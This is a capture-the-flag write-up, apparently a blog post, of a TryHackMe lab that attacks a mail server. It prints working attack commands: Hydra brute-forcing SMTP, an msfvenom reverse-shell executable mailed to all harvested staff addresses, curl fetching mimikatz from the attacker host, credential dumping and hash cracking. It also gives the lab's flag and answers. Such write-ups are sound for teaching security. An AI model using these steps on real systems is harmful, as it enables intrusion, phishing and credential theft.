---
title: "TryHackMe - You Got Mail"
date: 2025-05-25 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [mimikatz, windows, email, hydra, brute force, web scraping, SMTP, swaks, msfvenom, reverse shell, bash, python, hash, crackstation, payloads  ]
---


## Description

You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on `MACHINE_IP` and strictly passive reconnaissance on brownbrick.co. The scope includes only the domain and IP provided and does not include other TLDs.


## Reconnaissance

I began with a comprehensive port scan using **Nmap** to identify open services on the target machine. I ran the following command:

```
──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- -A 10.10.217.207
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 13:42 EDT
Nmap scan report for 10.10.217.207
Host is up (0.064s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 completed IMAP4rev1 CAPABILITY SORT QUOTA RIGHTS=texkA0001 IDLE OK ACL CHILDREN NAMESPACE
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-01T17:44:17+00:00
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-05-31T17:39:53
|_Not valid after:  2025-11-30T17:39:53
|_ssl-date: 2025-06-01T17:44:24+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows 10 1803 (92%), Windows Server 2019 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2025-06-01T17:44:18
|_  start_date: N/A

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   64.59 ms 10.23.0.1
2   64.66 ms 10.10.217.207

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.56 seconds
```
The scan results showed several interesting open ports and services:

- SMTP on ports 25 and 587, running hMailServer's SMTP daemon

- POP3 on port 110 and IMAP on port 143, also from hMailServer

- SMB-related ports 135, 139, and 445

- RDP on port 3389, indicating Windows Terminal Services

- Multiple MSRPC ports open

- HTTP services on non-standard ports (5985, 47001) responding with Microsoft HTTPAPI

The OS detection strongly suggested the target was a Windows Server 2019 or a Windows 10 machine. The presence of hMailServer services was a key insight into the environment's role as a mail server.

## Email adresses Enumeration

Browsing the website brownbrick.co (only passive recon allowed on this domain), I discovered a list of email addresses belonging to the development team. The emails I collected were:

![1](/images/yougotmail/1.jpg)
```
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
```

I saved these addresses into a file `emails.txt` to potentially use them later in password guessing attacks.

## Password Brute-Frocing with Hydra

To attempt initial access, I decided to brute force the SMTP login using the collected emails as usernames. My first approach used the popular `rockyou.txt` password list and Hydra for brute forcing. Unfortunately, this attempt failed, likely because the password was not in the default wordlist or account lockout protections were in place.

```
──(kali㉿kali)-[~/Desktop/You got mail]
└─$ hydra -L mails.txt -P /usr/share/wordlists/rockyou.txt 10.10217.207 smtp -s 587 -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-01 14:02:16
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 86066394 login tries (l:6/p:14344399), ~5379150 tries per task
[DATA] attacking smtp://10.10217.207:587/
[ERROR] could not resolve address: 10.10217.207
0 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-01 14:02:17
```
## Creating a custom Wordlist via Web Scraping

Realizing that default wordlists might not contain relevant passwords, I wrote a Python scraper to extract words from the company's website for a custom wordlist. The scraper downloads the site, strips HTML tags, extracts all words of at least six letters, converts them to lowercase, removes duplicates, and sorts them:

```python
import requests
from bs4 import BeautifulSoup
import re

url = "https://brownbrick.co"
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")
text = soup.get_text()
words = re.findall(r'\b[a-zA-Z]{6,}\b', text)
unique_words = sorted(set(word.lower() for word in words))
with open("custom_wordlist.txt", "w") as file:
    for word in unique_words:
        file.write(word + "\n")

print(f"Saved {len(unique_words)} words to custom_wordlist.txt")
```


This generated a targeted password list likely to contain words relevant to the organization or product names.

## Successful SMTP Login via Hydra and Custom Wordlist

Using the newly generated wordlist, I launched Hydra again against SMTP:

```console
┌──(kali㉿kali)-[~/Desktop/You got mail]
└─$ hydra -L emails.txt -P custom_wordlist.txt 10.10.217.207 smtp -s 587 -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-01 14:15:38
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 240 login tries (l:6/p:40), ~15 tries per task
[DATA] attacking smtp://10.10.217.207:587/
[587][smtp] host: 10.10.217.207   login: lhedvig@brownbrick.co   password: bricks
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-01 14:15:47
```

This time, **Hydra** discovered a valid login-password pair:

```
[587][smtp] host: 10.10.217.207   login: lhedvig@brownbrick.co   password: bricks
```
The password `bricks` was successfully cracked for the user `lhedvig@brownbrick.co`.

## Testing Email Sending via Swaks


To verify that I could interact with the SMTP service as the compromised user, I used `swaks` (Swiss Army Knife SMTP tool) to send a test email:

```
┌──(kali㉿kali)-[~/Desktop/You got mail]
└─$ swaks --to oaurelius@brownbrick.co \
--from lhedvig@brownbrick.co \
--server 10.10.217.207 \
--port 587 \
--auth LOGIN \
--auth-user lhedvig@brownbrick.co \
--auth-password bricks \
--data "Test mail"
=== Trying 10.10.217.207:587...
=== Connected to 10.10.217.207.
<-  220 BRICK-MAIL ESMTP
 -> EHLO kali
<-  250-BRICK-MAIL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> bGhlZHZpZ0Bicm93bmJyaWNrLmNv
<-  334 UGFzc3dvcmQ6
 -> YnJpY2tz
<-  235 authenticated.
 -> MAIL FROM:<lhedvig@brownbrick.co>
<-  250 OK
 -> RCPT TO:<oaurelius@brownbrick.co>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Test mail
 -> 
 -> 
 -> .
<-  250 Queued (0.062 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
The connection succeeded, confirming my ability to send emails from the compromised account.

## Preparing a Reverse Shell Paylod with msfvenom

To escalate from the mail server to remote code execution, I generated a Windows 64-bit reverse TCP shell executable using `msfvenom`:

```
┌──(kali㉿kali)-[~/Desktop/You got mail]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.23.106.242 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

```

## Emailing the Reverse Shell Payload

I automated sending the reverse shell executable as an attachment to each developer's email address using the `sendemail` CLI tool in a loop:

```bash
┌──(kali㉿kali)-[~/Desktop/You got mail]
└─$ while IFS= read -r email; do
  sendemail -f "lhedvig@brownbrick.co" \
            -t "$email" \
            -u "test" \
            -m "test" \
            -a shell.exe \
            -s 10.10.189.66:25 \
            -xu "lhedvig@brownbrick.co" \
            -xp "bricks"
done < emails.txt
Jun 01 15:22:09 kali sendemail[66466]: Email was sent successfully!
Jun 01 15:22:10 kali sendemail[66475]: Email was sent successfully!
Jun 01 15:22:11 kali sendemail[66484]: Email was sent successfully!
Jun 01 15:22:12 kali sendemail[66493]: Email was sent successfully!
Jun 01 15:22:13 kali sendemail[66502]: Email was sent successfully!
Jun 01 15:22:13 kali sendemail[66503]: Email was sent successfully!
```
This leveraged the SMTP server to deliver the payload to multiple recipients.

## Catching the Reverse Shell

I set up a Netcat listener on my machine:

```bash
nc -nvlp 4444
```
Soon after sending the malicious emails, I received an incoming connection from the target:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.23.106.242] from (UNKNOWN) [10.10.189.66] 49715
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Mail\Attachments>
```

This confirmed successful remote code execution with an interactive Windows shell.


## Capturing the First Flag

Navigating to the user desktop directory for `wrohit`, I found a file named `flag.txt`. Reading its contents revealed the first flag:

```console
C:\Users\wrohit\Desktop>dir    
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\wrohit\Desktop

03/11/2024  05:14 AM    <DIR>          .
03/11/2024  05:14 AM    <DIR>          ..
03/11/2024  05:15 AM                25 flag.txt
               1 File(s)             25 bytes
               2 Dir(s)  13,994,991,616 bytes free

C:\Users\wrohit\Desktop>type flag.txt
type flag.txt
THM{l1v1n_7h3_br1ck_l1f3}
C:\Users\wrohit\Desktop>
```

## Privilege Escalation with Mimikatz


The challenge hinted at dumping credentials stored in memory to escalate privileges. As an administrator, I proceeded to upload the well-known tool `mimikatz` to the compromised machine.

I started a Python HTTP server on my attacking machine to serve the mimikatz binary:

```console
┌──(kali㉿kali)-[/usr/share/windows-resources/mimikatz/x64]
└─$ ls
mimidrv.sys  mimikatz.exe  mimilib.dll  mimispool.dll
 ```                                         
 
 ```                        
┌──(kali㉿kali)-[/usr/share/windows-resources/mimikatz/x64]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.189.66 - - [01/Jun/2025 15:33:02] "GET /mimikatz.exe HTTP/1.1" 200 -
10.10.189.66 - - [01/Jun/2025 15:33:49] "GET /mimikatz.exe HTTP/1.1" 200 -
```

From the reverse shell, I downloaded mimikatz:

```console
C:\Users\wrohit\Desktop>curl http://10.23.106.242:1337/mimikatz.exe -o mimikatz.exe
```

Running mimikatz (`.\mimikatz.exe`) and executing the `sekurlsa::logonpasswords` command allowed me to extract plaintext passwords and NTLM hashes from the system memory.

Sample output:

```yaml
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 497501 (00000000:0007975d)
Session           : Batch from 0
User Name         : wrohit
Domain            : BRICK-MAIL
Logon Server      : BRICK-MAIL
Logon Time        : 6/1/2025 7:22:59 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1014
 msv :
  [00000003] Primary
  * Username : wrohit
  * Domain   : BRICK-MAIL
  * NTLM     : 8458995f1d0a4b0c107fb8e23362c814
  * SHA1     : ab5cc88336e18e54db987c44088757702d3a4c0f
 tspkg :
 wdigest :
  * Username : wrohit
  * Domain   : BRICK-MAIL
  * Password : superstar
 kerberos :
  * Username : wrohit
  * Domain   : BRICK-MAIL
  * Password : (null)
```
## Cracking Hashes

Using an online cracking tool such as [CrackStation](https://crackstation.net), I verified that the NTLM hash corresponded to the password:

![2](/images/yougotmail/2.jpg)


```console
8458995f1d0a4b0c107fb8e23362c814	NTLM	superstar
```

This provided full credentials for the user `wrohit`.

## Recovering the hMailServer Administrator Password (Final Flag)

After escalating my privileges and obtaining full access to the system, I continued my post-exploitation phase with a focus on extracting sensitive configuration data.

During enumeration, I discovered a configuration file belonging to `hMailServer` at the following location.

```
C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI
```

I opened the file and found that it contained multiple entries, including paths, database settings, and crucially, the hashed administrator password:

```
C:\Program Files (x86)\hMailServer\Bin>type hMailServer.INI
type hMailServer.INI
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
[Database]
Type=MSSQLCE
Username=
Password=47f104fa02185e821a83b2cfa56cf4ec
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

According to the hint provided in the challenge, `hMailServer` stores administrator passwords as MD5 hashes. The hash format matched this, and I proceeded to crack it using CrackStation another time.


![3](/images/yougotmail/3.jpg)

```
5f4dcc3b5aa765d61d8327deb882cf99	md5	password
```
Although the actual flag was not wrapped in THM{} format, the cracked password (`password`) was the expected answer to complete the challenge.